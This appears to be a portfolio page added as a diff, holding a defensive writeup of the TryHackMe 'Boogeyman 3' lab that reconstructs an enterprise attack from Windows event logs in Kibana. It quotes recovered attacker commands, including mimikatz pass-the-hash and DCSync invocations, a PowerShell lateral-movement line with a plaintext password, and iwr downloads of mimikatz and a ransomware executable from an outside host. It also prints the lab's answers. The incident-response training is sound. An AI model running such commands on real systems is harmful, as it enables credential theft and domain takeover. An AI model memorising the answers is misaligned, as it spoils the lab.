@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Boogeyman 3 - Advanced Windows Log Analysis | Tuned for Security</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .code-block {
+            background: #1f2937;
+            color: #f9fafb;
+            border-radius: 0.5rem;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.875rem;
+            margin: 1rem 0;
+        }
+        .highlight {
+            background: #fef3c7;
+            padding: 0.125rem 0.25rem;
+            border-radius: 0.25rem;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 text-gray-800 font-sans">
+
+    <nav class="sticky top-0 z-50 bg-white bg-opacity-90 backdrop-filter backdrop-blur-lg shadow-md">
+        <div class="container mx-auto px-6 py-4 flex justify-start items-center">
+            <a href="../index.html" class="text-2xl font-bold text-gray-800 transition duration-300 hover:text-gray-600">← Back to Portfolio</a>
+        </div>
+    </nav>
+
+    <main class="container mx-auto px-6 py-16">
+        <article class="bg-white p-8 rounded-lg shadow-xl max-w-6xl mx-auto">
+            
+            <!-- Header -->
+            <div class="text-center mb-12">
+                <div class="mb-8">
+                    <img src="../assets/images/blog/boogeyman-3-analysis.jpg" alt="Boogeyman 3 - Multi-Stage Attack Investigation" class="w-full h-auto rounded-lg shadow-md">
+                </div>
+                <h1 class="text-4xl md:text-5xl font-extrabold text-gray-900 mb-4">Boogeyman 3 - TryHackMe Writeup</h1>
+                <h2 class="text-xl md:text-2xl font-semibold text-gray-600 mb-6">Advanced Enterprise Attack Investigation & Windows Log Analysis</h2>
+                <div class="flex flex-wrap justify-center gap-2 mb-6">
+                    <span class="bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm font-semibold">Windows Event Logs</span>
+                    <span class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm font-semibold">Sysmon Analysis</span>
+                    <span class="bg-purple-100 text-purple-800 px-3 py-1 rounded-full text-sm font-semibold">Attack Chain Reconstruction</span>
+                    <span class="bg-red-100 text-red-800 px-3 py-1 rounded-full text-sm font-semibold">UAC Bypass</span>
+                    <span class="bg-yellow-100 text-yellow-800 px-3 py-1 rounded-full text-sm font-semibold">Lateral Movement</span>
+                    <span class="bg-indigo-100 text-indigo-800 px-3 py-1 rounded-full text-sm font-semibold">DCSync Attack</span>
+                </div>
+                <p class="text-gray-600">Published: September 2025 • Estimated reading time: 25 minutes</p>
+            </div>
+
+            <!-- Overview Section -->
+            <div class="bg-gray-100 p-6 rounded-lg mb-8">
+                <h2 class="text-2xl font-bold text-gray-800 mb-4">Overview</h2>
+                <div class="grid md:grid-cols-2 gap-6">
+                    <div>
+                        <ul class="space-y-2 text-gray-700">
+                            <li><strong>Difficulty:</strong> Medium-Hard</li>
+                            <li><strong>Skills Practiced:</strong> Advanced Windows Event Log Analysis, Multi-Host Investigation, Attack Timeline Reconstruction, PowerShell Forensics</li>
+                            <li><strong>Tools Used:</strong> Kibana/ELK Stack, PowerShell Analysis, Base64 Decoding, Multi-system Correlation</li>
+                            <li><strong>Time Investment:</strong> 3-4 hours</li>
+                        </ul>
+                    </div>
+                    <div>
+                        <p class="text-gray-700"><strong>Career Relevance:</strong> This room provides comprehensive experience with sophisticated APT-style enterprise attacks including HTA delivery, persistence mechanisms, UAC bypass, credential dumping, lateral movement, and domain controller compromise - essential skills for senior SOC analyst and threat hunting roles in enterprise environments.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Learning Objectives -->
+            <div class="mb-8">
+                <h2 class="text-2xl font-bold text-gray-800 mb-4">Learning Objectives</h2>
+                <p class="text-gray-700 leading-relaxed">
+                    Boogeyman 3 represents the culmination of the series, presenting a complete enterprise compromise scenario from initial HTA-based access through domain controller takeover and ransomware deployment. This investigation teaches advanced Windows event log analysis, multi-system correlation, and the systematic methodology required for reconstructing complex attack chains in enterprise environments.
+                </p>
+            </div>
+
+            <!-- Complete Investigation -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-6">Complete Investigation Analysis</h2>
+                
+                <!-- Phase 1: Initial Compromise -->
+                <div class="mb-12">
+                    <h3 class="text-2xl font-bold text-gray-800 mb-4">Phase 1: Initial Compromise Analysis</h3>
+                    
+                    <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
+                        <h4 class="font-semibold text-blue-800 mb-2">Investigation Approach</h4>
+                        <p class="text-blue-700">Started by filtering events containing references to HTML files and the malicious attachment to identify the initial execution chain. Used process tree analysis to understand parent-child relationships across the attack progression.</p>
+                    </div>
+
+                    <div class="code-block">
+# Primary search queries
+".html" OR "ProjectFinancialSummary_Q3.pdf"
+
+# Process analysis
+winlog.event_id: 1 AND process.name: mshta.exe
+</div>
+
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">Key Findings</h4>
+
+                    <div class="space-y-4">
+                        <div class="bg-gray-50 border-l-4 border-red-500 p-4">
+                            <h5 class="font-semibold text-red-800 mb-2">1. HTA File Execution</h5>
+                            <div class="code-block">
+Process: mshta.exe (PID 6392)
+Parent: explorer.exe (PID 2940)
+Command: "C:\Windows\SysWOW64\mshta.exe" "D:\ProjectFinancialSummary_Q3.pdf.hta"
+User: QUICKLOGISTICS\evan.hutchinson
+</div>
+                            <p class="text-gray-700 text-sm">The CEO executed the HTA file through Windows explorer, establishing initial access via HTML Application host.</p>
+                        </div>
+
+                        <div class="bg-orange-50 border-l-4 border-orange-500 p-4">
+                            <h5 class="font-semibold text-orange-800 mb-2">2. File Implantation Process</h5>
+                            <div class="code-block">
+Command: "C:\Windows\System32\xcopy.exe" /s /i /e /h 
+D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat
+</div>
+                            <p class="text-gray-700 text-sm">The malicious payload copied review.dat to the user's temp directory for persistent access.</p>
+                        </div>
+
+                        <div class="bg-purple-50 border-l-4 border-purple-500 p-4">
+                            <h5 class="font-semibold text-purple-800 mb-2">3. DLL Registration & Persistence</h5>
+                            <div class="code-block">
+Execution: "C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer
+
+Scheduled Task: "Review" 
+PowerShell: $A = New-ScheduledTaskAction -Execute 'rundll32.exe' 
+-Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'
+Register-ScheduledTask Review -InputObject $D -Force
+</div>
+                            <p class="text-gray-700 text-sm">The implanted file was executed using rundll32.exe and a scheduled task was created for daily execution at 6:00 AM.</p>
+                        </div>
+
+                        <div class="bg-blue-50 border-l-4 border-blue-500 p-4">
+                            <h5 class="font-semibold text-blue-800 mb-2">4. C2 Communication</h5>
+                            <div class="code-block">
+# Network connection analysis
+winlog.event_id: 3 AND process.name: rundll32.exe
+
+Connection: 165.232.170.151:80
+Process: rundll32.exe executing review.dat
+</div>
+                            <p class="text-gray-700 text-sm">The implanted file established external command and control communication.</p>
+                        </div>
+                    </div>
+
+                    <div class="bg-green-50 border-l-4 border-green-500 p-4 mt-6">
+                        <h4 class="font-semibold text-green-800 mb-2">Phase 1 Answers</h4>
+                        <ul class="space-y-1 text-green-700 text-sm">
+                            <li><strong>Initial Payload PID:</strong> <span class="highlight">6392</span></li>
+                            <li><strong>File Implantation Command:</strong> <span class="highlight">"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat</span></li>
+                            <li><strong>Implanted File Execution:</strong> <span class="highlight">"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer</span></li>
+                            <li><strong>Scheduled Task Name:</strong> <span class="highlight">Review</span></li>
+                            <li><strong>C2 Connection:</strong> <span class="highlight">165.232.170.151:80</span></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Phase 2: Privilege Escalation -->
+                <div class="mb-12">
+                    <h3 class="text-2xl font-bold text-gray-800 mb-4">Phase 2: Privilege Escalation</h3>
+                    
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">UAC Bypass Investigation</h4>
+                    <p class="text-gray-700 leading-relaxed mb-4">
+                        Searched for privilege escalation by filtering events from the rundll32.exe process executing review.dat and identified subsequent privilege escalation attempts.
+                    </p>
+
+                    <div class="code-block">
+# UAC bypass search
+process.parent.command_line: *review.dat* AND winlog.event_id: 1
+
+# Key finding: fodhelper.exe execution
+Process: fodhelper.exe
+Parent: rundll32.exe (executing review.dat)
+</div>
+
+                    <p class="text-gray-700 leading-relaxed mb-4">
+                        Research confirmed that fodhelper.exe is a trusted Windows binary that can be exploited for UAC bypass through registry hijacking, allowing privilege escalation without user prompts.
+                    </p>
+
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">Credential Dumping Tool Download</h4>
+
+                    <div class="code-block">
+# Tool download search
+winlog.event_id: 1 AND process.command_line: *github*
+
+# Mimikatz download command:
+"iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip"
+</div>
+
+                    <div class="bg-green-50 border-l-4 border-green-500 p-4 mt-6">
+                        <h4 class="font-semibold text-green-800 mb-2">Phase 2 Answers</h4>
+                        <ul class="space-y-1 text-green-700 text-sm">
+                            <li><strong>UAC Bypass Process:</strong> <span class="highlight">fodhelper.exe</span></li>
+                            <li><strong>GitHub Tool Link:</strong> <span class="highlight">https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip</span></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Phase 3: Lateral Movement -->
+                <div class="mb-12">
+                    <h3 class="text-2xl font-bold text-gray-800 mb-4">Phase 3: Credential Theft & Lateral Movement</h3>
+                    
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">Credential Harvesting</h4>
+
+                    <div class="code-block">
+# Credential dumping analysis
+process.command_line: *mimi* AND *sekurlsa*
+
+# Pass-the-hash execution:
+"C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" 
+"sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS 
+/ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe" exit
+</div>
+
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">File Share Enumeration</h4>
+
+                    <div class="code-block">
+# Share enumeration
+process.command_line: *Invoke-ShareFinder*
+
+# File access
+process.command_line: *ls FileSystem*
+process.command_line: *cat FileSystem*
+
+# IT_Automation.ps1 file accessed from \\WKSTN-1327\ITFiles
+</div>
+
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">Remote System Access</h4>
+
+                    <div class="code-block">
+# Lateral movement command
+"$credential = (New-Object PSCredential -ArgumentList 
+('QUICKLOGISTICS\allan.smith', (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' 
+-AsPlainText -Force))) ; Invoke-Command -Credential $credential 
+-ComputerName WKSTN-1327 -ScriptBlock {whoami}"
+
+# Investigation on target system
+host.name: WKSTN-1327 AND winlog.event_id: 1
+# Parent process: wsmprovhost.exe (WinRM)
+</div>
+
+                    <div class="bg-green-50 border-l-4 border-green-500 p-4 mt-6">
+                        <h4 class="font-semibold text-green-800 mb-2">Phase 3 Answers</h4>
+                        <ul class="space-y-1 text-green-700 text-sm">
+                            <li><strong>First Credential Pair:</strong> <span class="highlight">itadmin:F84769D250EB95EB2D7D8B4A1C5613F2</span></li>
+                            <li><strong>Remote File Accessed:</strong> <span class="highlight">IT_Automation.ps1</span></li>
+                            <li><strong>New Credentials Found:</strong> <span class="highlight">QUICKLOGISTICS\allan.smith:Tr!ckyP@ssw0rd987</span></li>
+                            <li><strong>Target Hostname:</strong> <span class="highlight">WKSTN-1327</span></li>
+                            <li><strong>Remote Parent Process:</strong> <span class="highlight">wsmprovhost.exe</span></li>
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Phase 4: Domain Compromise -->
+                <div class="mb-12">
+                    <h3 class="text-2xl font-bold text-gray-800 mb-4">Phase 4: Domain Controller Compromise</h3>
+                    
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">Second System Credential Dumping</h4>
+
+                    <div class="code-block">
+# Second system analysis
+host.name: WKSTN-1327 AND process.command_line: *mimikatz*
+
+# Administrator credentials found:
+administrator:00f80f2538dcb54e7adc715c0e7091ec
+</div>
+
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">Domain Controller Access & DCSync Attack</h4>
+
+                    <div class="code-block">
+# Domain controller investigation
+host.name: DC01.quicklogistics.org AND process.name: mimikatz.exe
+
+# DCSync attack:
+"C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe" 
+"lsadump::dcsync /domain:quicklogistics.org /user:backupda" exit
+</div>
+
+                    <h4 class="text-lg font-semibold text-gray-700 mb-2">Ransomware Deployment</h4>
+
+                    <div class="code-block">
+# Final stage - ransomware download
+"iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe"
+</div>
+
+                    <div class="bg-green-50 border-l-4 border-green-500 p-4 mt-6">
+                        <h4 class="font-semibold text-green-800 mb-2">Phase 4 Answers</h4>
+                        <ul class="space-y-1 text-green-700 text-sm">
+                            <li><strong>Second System Admin Hash:</strong> <span class="highlight">administrator:00f80f2538dcb54e7adc715c0e7091ec</span></li>
+                            <li><strong>DCSync Target Account:</strong> <span class="highlight">backupda</span></li>
+                            <li><strong>Ransomware URL:</strong> <span class="highlight">http://ff.sillytechninja.io/ransomboogey.exe</span></li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Attack Timeline -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Complete Attack Timeline</h2>
+                
+                <div class="bg-gradient-to-r from-red-50 to-orange-50 p-6 rounded-lg">
+                    <h3 class="text-xl font-bold text-gray-700 mb-4">Enterprise Compromise Progression</h3>
+                    
+                    <div class="space-y-4">
+                        <div class="border-l-4 border-red-500 pl-4">
+                            <h4 class="font-bold text-red-700">1. Initial Access (Aug 29, 23:51)</h4>
+                            <p class="text-gray-700 text-sm">HTA file execution → xcopy file implantation → rundll32.exe execution → scheduled task persistence</p>
+                        </div>
+                        
+                        <div class="border-l-4 border-orange-500 pl-4">
+                            <h4 class="font-bold text-orange-700">2. Privilege Escalation (Aug 29, 23:54)</h4>
+                            <p class="text-gray-700 text-sm">C2 communication → UAC bypass via fodhelper.exe → Mimikatz download</p>
+                        </div>
+                        
+                        <div class="border-l-4 border-yellow-500 pl-4">
+                            <h4 class="font-bold text-yellow-700">3. Lateral Movement (Aug 30, 00:13)</h4>
+                            <p class="text-gray-700 text-sm">Credential dumping → pass-the-hash → share enumeration → remote system access</p>
+                        </div>
+                        
+                        <div class="border-l-4 border-purple-500 pl-4">
+                            <h4 class="font-bold text-purple-700">4. Domain Takeover (Aug 30, 01:47)</h4>
+                            <p class="text-gray-700 text-sm">Second system compromise → domain controller access → DCSync attack</p>
+                        </div>
+                        
+                        <div class="border-l-4 border-pink-500 pl-4">
+                            <h4 class="font-bold text-pink-700">5. Final Impact (Aug 30, 01:53)</h4>
+                            <p class="text-gray-700 text-sm">Ransomware download → enterprise encryption capability</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Key Tools & Career Application -->
+            <div class="mb-12">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Key Tools & Career Application</h2>
+                
+                <div class="bg-gradient-to-r from-blue-50 to-purple-50 p-6 rounded-lg mb-6">
+                    <h3 class="text-xl font-bold text-gray-700 mb-3">Advanced Investigation Techniques</h3>
+                    <p class="text-gray-700 leading-relaxed">
+                        <strong>Multi-System Analysis:</strong> Kibana/ELK Stack for cross-system log correlation<br>
+                        <strong>Attack Reconstruction:</strong> Process tree analysis, timeline development, evidence correlation<br>
+                        <strong>Advanced Techniques:</strong> PowerShell forensics, base64 decoding, UAC bypass identification
+                    </p>
+                </div>
+
+                <div class="bg-gradient-to-r from-green-50 to-blue-50 p-6 rounded-lg">
+                    <h3 class="text-xl font-bold text-gray-700 mb-3">Senior SOC Analyst Capabilities</h3>
+                    <p class="text-gray-700 leading-relaxed mb-4">
+                        This investigation demonstrates comprehensive advanced persistent threat analysis capabilities essential for senior cybersecurity roles, including enterprise-scale incident response, sophisticated attack pattern recognition, and multi-stage threat hunting across complex environments.
+                    </p>
+                    <div class="grid md:grid-cols-3 gap-4">
+                        <div>
+                            <h4 class="font-bold text-gray-700 mb-2">Investigation Excellence</h4>
+                            <ul class="space-y-1 text-gray-600 text-sm">
+                                <li>• Complex attack chain reconstruction</li>
+                                <li>• Multi-host event correlation</li>
+                                <li>• Advanced PowerShell analysis</li>
+                                <li>• Systematic timeline development</li>
+                            </ul>
+                        </div>
+                        
+                        <div>
+                            <h4 class="font-bold text-gray-700 mb-2">Threat Hunting</h4>
+                            <ul class="space-y-1 text-gray-600 text-sm">
+                                <li>• APT technique recognition</li>
+                                <li>• Living off the land detection</li>
+                                <li>• Persistence mechanism analysis</li>
+                                <li>• Lateral movement tracking</li>
+                            </ul>
+                        </div>
+                        
+                        <div>
+                            <h4 class="font-bold text-gray-700 mb-2">Enterprise Security</h4>
+                            <ul class="space-y-1 text-gray-600 text-sm">
+                                <li>• Domain controller forensics</li>
+                                <li>• Credential dumping detection</li>
+                                <li>• Ransomware analysis</li>
+                                <li>• Impact assessment</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Key Learning -->
+            <div class="mb-8">
+                <h2 class="text-3xl font-bold text-gray-800 mb-4">Investigation Methodology & Reflection</h2>
+                
+                <div class="bg-gray-100 p-6 rounded-lg">
+                    <h3 class="text-xl font-bold text-gray-700 mb-3">Systematic Investigation Approach</h3>
+                    <p class="text-gray-700 leading-relaxed mb-4">
+                        Boogeyman 3 required a disciplined, systematic approach to reconstruct a sophisticated, multi-stage enterprise attack. The investigation emphasized the critical importance of patient timeline reconstruction, understanding advanced evasion techniques, and maintaining evidence integrity across multiple systems and attack stages.
+                    </p>
+                    
+                    <div class="grid md:grid-cols-2 gap-6">
+                        <div>
+                            <h4 class="font-bold text-gray-700 mb-2">Critical Technical Insights</h4>
+                            <ul class="space-y-2 text-gray-700 text-sm">
+                                <li>• <strong>Process Genealogy:</strong> Understanding complete parent-child process relationships is essential for attack reconstruction</li>
+                                <li>• <strong>PowerShell Forensics:</strong> Base64 decoding and obfuscation analysis are critical for modern threat investigation</li>
+                                <li>• <strong>Cross-System Correlation:</strong> Enterprise attacks require coordinated analysis across multiple compromised systems</li>
+                                <li>• <strong>Persistence Analysis:</strong> Advanced threats use sophisticated mechanisms like scheduled tasks and registry manipulation</li>
+                            </ul>
+                        </div>
+                        
+                        <div>
+                            <h4 class="font-bold text-gray-700 mb-2">Professional Development</h4>
+                            <ul class="space-y-2 text-gray-700 text-sm">
+                                <li>• <strong>Advanced SIEM Mastery:</strong> Complex query construction and multi-source log correlation</li>
+                                <li>• <strong>Threat Intelligence Integration:</strong> Mapping observed TTPs to MITRE ATT&CK framework</li>
+                                <li>• <strong>Incident Response Leadership:</strong> Comprehensive investigation documentation and stakeholder communication</li>
+                                <li>• <strong>Enterprise Architecture:</strong> Understanding Active Directory, domain controllers, and enterprise security</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-6 p-4 bg-blue-100 rounded">
+                        <h4 class="font-bold text-blue-800 mb-2">Key Takeaways</h4>
+                        <p class="text-blue-700 text-sm">
+                            This investigation provided comprehensive experience with a complete APT-style enterprise compromise, demonstrating the systematic methodology required for advanced threat hunting and incident response in complex corporate environments. The multi-stage attack reconstruction showcases the analytical rigor and technical proficiency essential for senior cybersecurity roles.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+        </article>
+    </main>
+
+</body>
+</html>
